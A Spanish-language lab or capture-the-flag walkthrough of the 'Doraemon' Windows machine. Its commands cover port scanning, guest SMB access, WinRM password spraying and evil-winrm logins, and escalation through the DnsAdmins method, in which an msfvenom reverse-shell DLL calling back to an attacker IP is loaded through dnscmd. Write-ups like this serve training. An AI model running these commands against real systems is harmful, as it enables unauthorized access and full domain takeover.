# Máquina Doraemon
### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.192

![alt text](image-1.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49672,49676,49708 -vvv -Pn 192.168.5.192

![alt text](image-2.png)


### Explotación 

Analizo Samba

smbmap -H 192.168.5.192 -u "invitado"

![alt text](image-3.png)

me conecto al recurso compartido mediante smbclient y descargo el archivo kedadawapa.txt

smbclient -U "invitado" //192.168.5.192/gorrocoptero

![alt text](image-4.png)

veo el contenido del archivo descargado

![alt text](image-5.png)

![alt text](image-6.png)

guardo todos los nombres en 2 archivos, users.txt y passwords.txt

como tengo el servicio WinRM corriendo en el puerto 5985, pruebo credenciales

nxc winrm 192.168.5.192 -u users.txt -p passwords.txt

![alt text](image-7.png)

me conecté por evil-winrm

evil-winrm -i 192.168.5.192 -u "Doraemon" -p "Dorayaki1"

![alt text](image-8.png)

en la carpeta Links encontré un archivo oculto

![alt text](image-9.png)

guardo la contraseña, y vuelvo a ver si a algún otro usuario tiene conexión remota con esa contraseña:

nxc winrm 192.168.5.192 -u users.txt -p "ShizukaTeAmobb12345"

![alt text](image-10.png)

me conecto con evil-winrm y veo los grupos a los que pertenece

![alt text](image-11.png)

![alt text](image-12.png)

### POST-EXPLOTACIÓN

Creo una dll con msfvenom en kali

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.5.131 LPORT=443 -f dll > rev.dll

luego levanto un servidor SMB

impacket-smbserver -smb2support smbfolder $(pwd)

luego me pongo en escucha con netcat en el puerto 443 

nc -lvnp 443

En evil-winrm

dnscmd.exe /config /serverlevelplugindll \\192.168.5.131\smbFolder\rev.dll

sc.exe stop dns

sc.exe start dns

![alt text](image-13.png)

![alt text](image-14.png)

![alt text](image-15.png)

### user.txt

![alt text](image-16.png)

### root.txt

![alt text](image-17.png)